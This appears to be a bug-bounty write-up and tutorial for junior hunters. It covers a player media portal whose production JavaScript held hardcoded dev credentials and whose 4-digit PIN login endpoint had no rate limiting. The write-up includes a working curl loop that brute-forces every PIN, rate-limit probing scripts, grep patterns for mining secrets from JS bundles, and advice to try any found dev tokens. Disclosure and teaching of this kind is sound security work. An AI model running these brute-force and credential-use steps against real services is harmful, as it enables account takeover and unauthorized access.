# CS-04: PIN Brute Force + Hardcoded Credentials in Production JS

← [[Case-Studies-Overview]]

**Vuln class:** Broken Authentication (CWE-307 + CWE-798)  
**Severity:** P2 / CVSS 7.4 HIGH  
**Program:** Large media company VDP (Intigriti)  
**Two separate CWEs, one report — both found from JS bundle analysis**

---

## TL;DR

A sports club's player media sharing app authenticated users with a "magic link + 4-digit PIN" scheme. The PIN verification endpoint had no rate limiting — 10,000 guesses exhausted the full keyspace in ~30 seconds. Additionally, the production JavaScript bundle contained a hardcoded player entry with actual authentication credentials (`magicToken` and `pin`) alongside PII (player's full name, active status). Both issues were found by reading the client-side JavaScript.

---

## The App

A private media portal where professional sports players could access and share their personal photo/video galleries. Authentication worked as:
1. Player receives a magic link URL (via email or QR code at events)
2. Player visits the URL, which contains a unique token
3. Player enters a 4-digit PIN to complete login
4. App verifies: `POST /api/v1/auth/magic/{token}` with `{"pin": "xxxx"}`

---

## Finding 1: Hardcoded Credentials in the Production JS Bundle

**How it was found:**

During recon, the app was a SvelteKit single-page app. SvelteKit bundles all JavaScript into chunks at `/app/immutable/chunks/`. These are production files, fully readable by any visitor.

```bash
# Fetch the production JS bundle
curl https://example-player-portal.com/_app/immutable/chunks/BUNDLENAME.js
```

Inside one of the chunks, buried in minified JavaScript, was a `players` dictionary:

```javascript
// Actual structure found (redacted):
const d = {
  "player-REDACTED": {
    id: "player-REDACTED",
    firstName: "[REDACTED]",
    lastName: "[REDACTED]",
    frontifyName: "[REDACTED FULL NAME]",
    magicToken: "dev-token-REDACTED",
    pin: "REDACTED",
    active: true
  }
}
```

This is a developer fixture — the kind of test data you create during development to avoid setting up a full auth flow for every test. The problem: **it shipped to production** without a build-time flag to exclude it.

The same object was immediately used as a lookup table:
```javascript
Object.fromEntries(Object.values(d).map(e => [e.magicToken, e]))
```

This confirms the `magicToken` is the URL token and the `pin` is the actual PIN for this test entry.

**Additional intel extracted from the bundle:**

- Admin route tree: `/admin`, `/admin/players`, `/admin/teams`, `/admin/tenants`, `/admin/audit`
- Client-side auth code structure (confirms how to use a valid token + PIN)
- The service is multi-tenant with admin routes that could affect other organizations' data

**Severity:** Credential and PII exposure in a production artifact, independent of whether the credentials are still active.

---

## Finding 2: No Rate Limiting on the PIN Endpoint

**The math:**

A 4-digit PIN has exactly `10^4 = 10,000` possible values (0000–9999).

Without rate limiting, the entire keyspace is exhaustible in ~30 seconds over a standard internet connection with parallel requests.

**The test:**

Send 5 rapid requests in parallel and observe whether any rate limiting fires:

```bash
for i in 1 2 3 4 5; do
  curl -s -X POST \
    "https://api.player-portal.example.com/api/v1/auth/magic/TEST_TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"pin":"000'"$i"'"}' &
done
wait
```

Each of the 5 responses returned:
- HTTP 401 (expected — test token was invalid)
- A **unique traceId** per response
- No `Retry-After` header
- No HTTP 429 response

**The unique traceIds are the key evidence.** Each traceId means each request was independently processed by the backend — nothing was cached, dropped, or blocked. The server processed all 5 requests as new attempts.

**Attack chain (when a valid magic link token is obtained):**

```bash
TOKEN="<valid-magic-link-from-intercepted-email-or-qr-code>"
for PIN in $(seq -f "%04g" 0 9999); do
  RESP=$(curl -s -X POST \
    "https://api.player-portal.example.com/api/v1/auth/magic/${TOKEN}" \
    -H "Content-Type: application/json" \
    -d "{\"pin\":\"${PIN}\"}")
  if ! echo "$RESP" | grep -q '"code":401'; then
    echo "Found PIN: $PIN"
    echo "$RESP"
    break
  fi
done
```

Expected time: ~30 seconds (average ~15s to find PIN if uniformly distributed).

**Precondition:** Valid magic link token. These were distributed via email and QR codes at events — not a high bar for acquisition in a social engineering or phishing scenario.

---

## CVSS Breakdown

```
AV:N  - API publicly reachable
AC:H  - Attacker must possess a valid, unexpired magic link token (elevated precondition)
PR:N  - No account or credentials required
UI:N  - No victim interaction needed
S:U   - Impact scoped to the compromised player account
C:H   - Full read on player's private media gallery, team data, tenant info
I:L   - Limited write capability post-auth
A:N   - No availability impact

Score: 7.4 HIGH
```

`AC:H` (High complexity) instead of Low — because obtaining a valid magic link token is a real precondition that reduces likelihood. If the precondition were easier, this would be P1.

---

## Key Techniques for Juniors

### JS Bundle Mining

JavaScript bundles are production artifacts that ship to every visitor's browser. Everything inside them is readable:
- API endpoint paths
- Authentication mechanisms and token structure
- Feature flags
- Hardcoded credentials (development artifacts, service accounts)
- Internal URLs and config
- Admin route trees

**How to search:**
```bash
# Download all JS files from a page
# Use browser DevTools → Sources tab → right-click → Save all
# Or use wget recursive
wget -r -A "*.js" https://target.example.com

# Search for interesting patterns
grep -r "password\|token\|secret\|key\|api_key\|hardcoded" *.js
grep -r "dev-token\|test-\|staging-\|admin:\|pass:" *.js
grep -r "localStorage\|sessionStorage" *.js  # for stored secrets
```

**Automated tools:**
- `secretfinder.py` — scans JS for API keys, tokens, secrets
- `LinkFinder.py` — extracts endpoints from JS
- Browser extension: `retire.js` — finds vulnerable JS libraries

### Rate Limit Testing

For any authentication endpoint, always test:

```bash
# Send 10 rapid requests in parallel
for i in $(seq 1 10); do
  curl -s -o /dev/null -w "%{http_code}\n" -X POST https://target.com/login \
    -d '{"user":"test","pass":"wrong"}' &
done
wait
```

If you see all 200s or 401s without a single 429, rate limiting is absent.

**What to look for:**
- HTTP 429 Too Many Requests
- `Retry-After` header
- `X-RateLimit-Remaining` header approaching 0
- Account lockout messages

**What the absence means:**
- Brute-force is feasible
- Credential stuffing is unconstrained
- OTP bypass may be possible

### The "Dev Token in Production" Pattern

This is more common than you'd think. Development artifacts end up in production because:
- Build scripts don't strip dev fixtures
- Environment variables aren't properly flagged (`import.meta.env.PROD` check missing)
- The fixture is committed to the codebase and never removed

When you find a `dev-`, `test-`, or `staging-` prefixed token in a production JS file:
1. Note the structure (how is it used? what does it authenticate?)
2. Try to use it (even if "expired" dev credentials sometimes work in prod)
3. Report regardless — even if invalid, credentials in production code is CWE-798 and a reportable finding

---

## What Makes This Report P2 vs P1

The `AC:H` (High complexity precondition — valid magic link required) drops this from P1 to P2. If the magic link was guessable, predictable, or didn't expire, the complexity would be `AC:L` and this would be P1.

The hardcoded credentials finding is a separate CWE-798 finding — it's P2/P3 on its own depending on whether the credentials are still valid and what they access.

Combining both in one report makes sense because they were found together and both relate to authentication in the same app.

---

## Practice This

- **PortSwigger Labs:** Authentication vulnerabilities → Brute-forcing a stay-logged-in cookie
- **TryHackMe:** Look for "Authentication Bypass" rooms
- **Real practice:** Any app with OTP/PIN auth — count digits, test for rate limiting, test for lockout

---

*Related: [[A07-Auth-Failures]] | [[JS-Recon]] | [[Case-Studies-Overview]] | [[Race-Conditions]]*

*Sources: Real Intigriti VDP submission*
